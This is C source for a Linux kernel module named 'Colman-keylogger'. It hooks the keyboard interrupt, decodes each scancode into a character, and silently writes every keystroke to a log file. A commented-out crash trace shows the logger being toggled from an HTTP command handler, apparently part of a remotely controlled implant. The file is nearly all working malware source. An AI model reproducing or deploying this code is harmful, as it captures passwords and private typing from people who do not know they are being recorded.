#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>
#include <linux/string.h>
#include <linux/slab.h>
#include "keylogger.h"
#include "kernel_io.h"

#define KB_IRQ 1

struct file* log_fp;

struct task_struct *logger;

struct logger_data{
	unsigned char scancode;
};

struct logger_data * ld;

const char *NAME = "Colman-keylogger";

char keylogger_set = 0;

void tasklet_logger(unsigned long data)
{
	static int shift = 0;
	
	char buf[32];
	memset(buf, 0, sizeof(buf));
	/* Convert scancode to readable key and log it. */
	switch(ld->scancode){
		default: 
			return;

		case 1:
			strcpy(buf, "(ESC)"); break;

		case 2:
			strcpy(buf, (shift) ? "!" : "1"); break;

		case 3:
			strcpy(buf, (shift) ? "@" : "2"); break;

		case 4:
			strcpy(buf, (shift) ? "#" : "3"); break;
		
		case 5:
			strcpy(buf, (shift) ? "$" : "4"); break;

		case 6:
			strcpy(buf, (shift) ? "%" : "5"); break;

		case 7:
			strcpy(buf, (shift) ? "^" : "6"); break;

		case 8:
			strcpy(buf, (shift) ? "&" : "7"); break;

		case 9:
			strcpy(buf, (shift) ? "*" : "8"); break;

		case 10:
			strcpy(buf, (shift) ? "(" : "9"); break;

		case 11:
			strcpy(buf, (shift) ? ")" : "0"); break;

		case 12:
			strcpy(buf, (shift) ? "_" : "-"); break;

		case 13:
			strcpy(buf, (shift) ? "+" : "="); break;

		case 14:
			strcpy(buf, "(BACK)"); break;

		case 15:
			strcpy(buf, "(TAB)"); break;

		case 16:
			strcpy(buf, (shift) ? "Q" : "q"); break;

		case 17:
			strcpy(buf, (shift) ? "W" : "w"); break;

		case 18:
			strcpy(buf, (shift) ? "E" : "e"); break;

		case 19:
			strcpy(buf, (shift) ? "R" : "r"); break;

		case 20:
			strcpy(buf, (shift) ? "T" : "t"); break;

		case 21:
			strcpy(buf, (shift) ? "Y" : "y"); break;

		case 22:
			strcpy(buf, (shift) ? "U" : "u"); break;

		case 23:
			strcpy(buf, (shift) ? "I" : "i"); break;

		case 24:
			strcpy(buf, (shift) ? "O" : "o"); break;

		case 25:
			strcpy(buf, (shift) ? "P" : "p"); break;

		case 26:
			strcpy(buf, (shift) ? "{" : "["); break;

		case 27:
			strcpy(buf, (shift) ? "}" : "]"); break;

		case 28:
			strcpy(buf, "(ENTER)"); break;

		case 29:
			strcpy(buf, "(CTRL)"); break;

		case 30:
			strcpy(buf, (shift) ? "A" : "a"); break;

		case 31:
			strcpy(buf, (shift) ? "S" : "s"); break;

		case 32:
			strcpy(buf, (shift) ? "D" : "d"); break;

		case 33:
			strcpy(buf, (shift) ? "F" : "f"); break;
	
		case 34:
			strcpy(buf, (shift) ? "G" : "g"); break;

		case 35:
			strcpy(buf, (shift) ? "H" : "h"); break;

		case 36:
			strcpy(buf, (shift) ? "J" : "j"); break;

		case 37:
			strcpy(buf, (shift) ? "K" : "k"); break;

		case 38:
			strcpy(buf, (shift) ? "L" : "l"); break;
	
		case 39:
			strcpy(buf, (shift) ? ":" : ";"); break;

		case 40:
			strcpy(buf, (shift) ? "\"" : "'"); break;

		case 41:
			strcpy(buf, (shift) ? "~" : "`"); break;

		case 42:
		case 54:
			shift = 1; break;

		case 170:
		case 182:
			shift = 0; break;

		case 44:
			strcpy(buf, (shift) ? "Z" : "z"); break;
		
		case 45:
			strcpy(buf, (shift) ? "X" : "x"); break;

		case 46:
			strcpy(buf, (shift) ? "C" : "c"); break;

		case 47:
			strcpy(buf, (shift) ? "V" : "v"); break;
		
		case 48:
			strcpy(buf, (shift) ? "B" : "b"); break;

		case 49:
			strcpy(buf, (shift) ? "N" : "n"); break;

		case 50:
			strcpy(buf, (shift) ? "M" : "m"); break;

		case 51:
			strcpy(buf, (shift) ? "<" : ","); break;

		case 52:
			strcpy(buf, (shift) ? ">" : "."); break;
	
		case 53:
			strcpy(buf, (shift) ? "?" : "/"); break;

		case 56:
			strcpy(buf, "(R-ALT"); break;
	
		/* Space */
		case 55:
		case 57:
		case 58:
		case 59:
		case 60:
		case 61:
		case 62:
		case 63:
		case 64:
		case 65:
		case 66:
		case 67:
		case 68:
		case 70:
		case 71:
		case 72:
			strcpy(buf, " "); break;

		case 83:
			strcpy(buf, "(DEL)"); break;
	}

	kfile_write(log_fp, buf, strlen(buf));
}

/* Registers the tasklet for logging keys. */
DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);

/* ISR for keyboard IRQ. */
irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	/* Set global value to the received scancode. */
	ld->scancode = inb(0x60);

	/* We want to avoid I/O in an ISR, so schedule a Linux tasklet to
	 * write the key to the log file at the next available time in a 
	 * non-atomic context.
	 */
	tasklet_schedule(&my_tasklet);
	
	return (irq_handler_t)IRQ_HANDLED;
}

int set_keylogger(char * k_file_path)
{
	int ret = -1;
	char buf[32];

	ld = (struct logger_data *)kmalloc(sizeof(struct logger_data), GFP_ATOMIC);

	if (keylogger_set)
		return -2;

	if (!k_file_path)
	{
		printk(KERN_INFO "[-] Colman: path is not allocated.\n");
		return 1;
	}
	
	/* Open log file as write only, create if it doesn't exist. */
	log_fp = kfile_open(k_file_path, O_WRONLY | O_CREAT, 0644);
	if(IS_ERR(log_fp)){
		printk(KERN_INFO "[-] Colman: FAILED to open log file.\n");
		return 1;
	}
	else{
		/* Log file opened, print debug message. */
		printk(KERN_INFO "[+] Colman: SUCCESSFULLY opened log file.\n");

		/* Write title to log file. */	
		memset(buf, 0, sizeof(buf));
		strcpy(buf, "-LOG START-\n\n");
		kfile_write(log_fp, buf, sizeof(buf));
	}

	/* Request to register a shared IRQ handler (ISR). */
	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
			NAME, ld);
	if(ret != 0){
		printk(KERN_INFO "[-] Colman: FAILED to request IRQ for keyboard.\n");
	}
	keylogger_set = 1;
	return ret;
}


void unset_keylogger(void)
{
	/*[ 1231.389227] softirq: Attempt to kill tasklet from interrupt
[ 1231.389229] ------------[ cut here ]------------
[ 1231.389231] Trying to free IRQ 1 from IRQ context!
[ 1231.389244] WARNING: CPU: 0 PID: 7 at /build/linux-uQJ2um/linux-4.15.0/kernel/irq/manage.c:1567 __free_irq+0x218/0x2a0
[ 1231.389245] Modules linked in: colman(OE) rfcomm bnep crct10dif_pclmul crc32_pclmul ghash_clmulni_intel pcbc vmw_balloon aesni_intel aes_x86_64 crypto_simd glue_helper cryptd intel_rapl_perf snd_ens1371 snd_ac97_codec gameport ac97_bus snd_pcm joydev input_leds serio_raw snd_seq_midi snd_seq_midi_event snd_rawmidi snd_seq btusb btrtl snd_seq_device snd_timer btbcm btintel snd bluetooth ecdh_generic soundcore mac_hid shpchp vmw_vsock_vmci_transport vsock vmw_vmci sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 hid_generic usbhid hid vmwgfx psmouse ttm drm_kms_helper syscopyarea sysfillrect sysimgblt mptspi e1000 ahci libahci fb_sys_fops mptscsih drm mptbase scsi_transport_spi i2c_piix4 pata_acpi [last unloaded: colman]
[ 1231.389312] CPU: 0 PID: 7 Comm: ksoftirqd/0 Tainted: G        W  OE    4.15.0-45-generic #48-Ubuntu
[ 1231.389313] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 04/13/2018
[ 1231.389317] RIP: 0010:__free_irq+0x218/0x2a0
[ 1231.389318] RSP: 0018:ffff9b94c036b840 EFLAGS: 00010286
[ 1231.389320] RAX: 0000000000000000 RBX: 0000000000000001 RCX: 0000000000000006
[ 1231.389321] RDX: 0000000000000007 RSI: 0000000000000082 RDI: ffff8a7e3b616490
[ 1231.389323] RBP: ffff9b94c036b878 R08: 0000000000000001 R09: 00000000000007f2
[ 1231.389324] R10: 0000000000000040 R11: 0000000000000000 R12: 0000000000000001
[ 1231.389325] R13: ffffffffc04f93c9 R14: ffff8a7df8633f60 R15: ffff8a7e3f81c400
[ 1231.389327] FS:  0000000000000000(0000) GS:ffff8a7e3b600000(0000) knlGS:0000000000000000
[ 1231.389329] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1231.389330] CR2: 00007f7d9a3c24d0 CR3: 0000000049e0a003 CR4: 00000000003606f0
[ 1231.389342] Call Trace:
[ 1231.389347]  ? vprintk_default+0x29/0x50
[ 1231.389353]  free_irq+0x35/0x70
[ 1231.389358]  unset_keylogger.part.0+0x26/0x40 [colman]
[ 1231.389361]  switch_keylogger+0x2a/0x40 [colman]
[ 1231.389364]  http_callback_get_command+0x4db/0x510 [colman]
[ 1231.389368]  ? update_load_avg+0x57f/0x6e0
[ 1231.389372]  ? crypto_shash_update+0x47/0x130
[ 1231.389375]  ? update_curr+0xf2/0x1d0
[ 1231.389378]  ? __enqueue_entity+0x5c/0x60
[ 1231.389381]  ? enqueue_entity+0x10e/0x6b0
[ 1231.389385]  ? check_preempt_wakeup+0x10e/0x240
[ 1231.389387]  ? check_preempt_curr+0x2d/0x90
[ 1231.389389]  ? ttwu_do_wakeup+0x1e/0x140
[ 1231.389391]  ? ttwu_do_activate+0x77/0x80
[ 1231.389393]  ? try_to_wake_up+0x59/0x4b0
[ 1231.389397]  nf_hook_slow+0x48/0xc0
[ 1231.389399]  ip_rcv+0x2fa/0x3a0
[ 1231.389401]  ? inet_del_offload+0x40/0x40
[ 1231.389406]  __netif_receive_skb_core+0x432/0xb40
[ 1231.389410]  ? tcp4_gro_receive+0x13b/0x1a0
[ 1231.389413]  __netif_receive_skb+0x18/0x60
[ 1231.389416]  ? __netif_receive_skb+0x18/0x60
[ 1231.389418]  netif_receive_skb_internal+0x37/0xd0
[ 1231.389420]  napi_gro_receive+0xc5/0xf0
[ 1231.389426]  e1000_clean_rx_irq+0x194/0x520 [e1000]
[ 1231.389431]  e1000_clean+0x27c/0x890 [e1000]
[ 1231.389434]  net_rx_action+0x140/0x3a0
[ 1231.389438]  ? __switch_to_asm+0x34/0x70
[ 1231.389441]  __do_softirq+0xe4/0x2bb
[ 1231.389445]  run_ksoftirqd+0x22/0x60
[ 1231.389448]  smpboot_thread_fn+0xfc/0x170
[ 1231.389451]  kthread+0x121/0x140
[ 1231.389454]  ? sort_range+0x30/0x30
[ 1231.389457]  ? kthread_create_worker_on_cpu+0x70/0x70
[ 1231.389460]  ret_from_fork+0x35/0x40
[ 1231.389461] Code: b1 00 49 8b 47 40 48 8b 80 80 00 00 00 48 85 c0 74 99 4c 89 f7 e8 59 26 b1 00 eb 8f 44 89 e6 48 c7 c7 68 3e ed a4 e8 58 b8 f9 ff <0f> 0b e9 17 fe ff ff 49 8d 7f 28 e8 38 26 b1 00 e9 36 fe ff ff 
[ 1231.389503] ---[ end trace a5d84b5c0c8f4be2 ]---
*/

	if (!keylogger_set)
	{
		return;
	}

	/* Free the logging tasklet. */
	tasklet_kill(&my_tasklet);

	if (ld) { 
		/* Free the shared IRQ handler, giving system back original control. */
		free_irq(KB_IRQ, ld);
	}

	/* Close log file handle. */
	if(log_fp != NULL){
		kfile_close(log_fp);
	}

	if (ld)
	{
		kfree(ld);
	}
	keylogger_set = 0;
}

int switch_keylogger( char * path, char kill )
{
	// if (path)
	// {
	// 	printk(KERN_INFO "[+] Colman: in switch_keylogger: %s.\n", path);
	// 	return 1;
	// }

	if (!keylogger_set && !kill)
	{
		set_keylogger(path);
		return 1;	
	}
	if (keylogger_set){
		unset_keylogger();
	}
	return 0;
}
